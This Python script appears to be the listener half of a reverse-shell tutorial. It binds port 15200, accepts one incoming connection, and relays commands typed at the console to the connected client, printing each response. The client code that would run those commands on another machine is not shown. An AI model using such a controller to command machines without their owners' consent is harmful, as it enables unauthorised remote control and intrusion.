import socket
import sys

# Creating a socket
def socket_create():
    try:
        global host
        global port
        global s
        host = ''
        port = 15200
        s = socket.socket()
    except socket.error as msg:
        print("Socket creation error: " + str(msg))

# Bind socket to port
def socket_bind():
    try:
        global host
        global port
        global s
        print("Binding socket to port: " + str(port))
        s.bind((host, port))
        s.listen(5)
    except socket.error as msg:
        print("Socket binding failed." + str(msg) + "\nRetrying..." )
        socket_bind()

# Listening to establish client connection
def socket_accept():
    conn, addr_ = s.accept()
    print ("Connection established | " + "IP " + addr_[0] + " | Port " + str(addr_[1]))
    send_commands(conn)
    conn.close()

def send_commands(conn):
    while True:
        comm = input()
        if comm == 'quit':
            conn.close()
            s.close()
            sys.exit()
        if len(str.encode(comm)) > 0:
            conn.send(str.encode(comm))
            client_response = str(conn.recv(1024), "utf-8" )
            print(client_response, end="")

def main():
    socket_create()
    socket_bind()
    socket_accept()

main()
